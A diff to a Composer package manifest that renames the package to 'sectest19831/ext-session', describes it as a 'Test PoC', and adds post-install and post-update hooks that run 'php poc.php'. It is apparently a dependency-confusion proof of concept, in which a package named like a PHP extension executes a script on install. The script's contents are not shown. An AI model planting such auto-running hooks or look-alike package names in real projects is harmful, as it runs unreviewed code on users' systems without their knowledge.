@@ -1,8 +1,17 @@
 {
-    "name": "root/ext-session",
+    "name": "sectest19831/ext-session",
     "description": "Test PoC",
     "type": "library",
     "require": {
-        "ext-session": "^7.4"
+        "ext-session": "*"
+    },
+    "scripts": {
+        "post-install-cmd": [
+            "php poc.php"
+        ],
+        "post-update-cmd": [
+            "php poc.php"
+        ]
     }
 }
+
